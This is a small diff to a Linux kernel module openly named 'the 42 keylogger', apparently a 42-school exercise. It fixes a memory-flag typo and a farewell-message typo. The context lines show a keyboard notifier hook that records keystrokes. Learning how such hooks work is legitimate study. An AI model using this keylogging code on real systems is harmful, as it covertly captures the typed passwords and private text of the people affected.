@@ -38,7 +38,7 @@ static int	keyboard_event(struct notifier_block *nb, unsigned long action, void 
 	struct timespec64		ts;
 	struct s_keystroke		*stroke;
 
-	stroke = kmalloc(sizeof(struct s_keystroke), GPF_ATOMIC);
+	stroke = kmalloc(sizeof(struct s_keystroke), GFP_ATOMIC);
 	if (!stroke || action != KBD_KEYCODE)
 		return kfree(stroke), NOTIFY_OK;
 	memcpy(&(stroke->key), &(keys_table[param->value]), sizeof(struct s_key));
@@ -73,7 +73,7 @@ static void __exit dni_exit(void)
 {
 	misc_deregister(&device);
 	unregister_keyboard_notifier(&keyboard_nb);
-	pr_info("by from the 42 keylogger\n");
+	pr_info("bye from the 42 keylogger\n");
 }
 
 module_init(dni_init);
